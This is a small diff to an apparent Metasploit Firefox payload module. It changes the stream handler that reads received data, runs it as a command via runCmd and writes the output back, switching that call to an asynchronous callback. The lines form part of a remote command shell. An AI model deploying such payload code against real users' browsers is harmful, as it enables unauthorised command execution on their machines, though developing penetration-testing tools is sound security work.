@@ -51,8 +51,9 @@ module Metasploit3
           onStopRequest: function(request, context) {},
           onDataAvailable: function(request, context, stream, offset, count) {
             var data = NetUtil.readInputStreamToString(stream, count).trim();
-            var output = runCmd(data);
-            outStream.write(output[0], output[0].length);
+            runCmd(data, function(output) {
+              outStream.write(output, output.length);
+            });
           }
         };
 
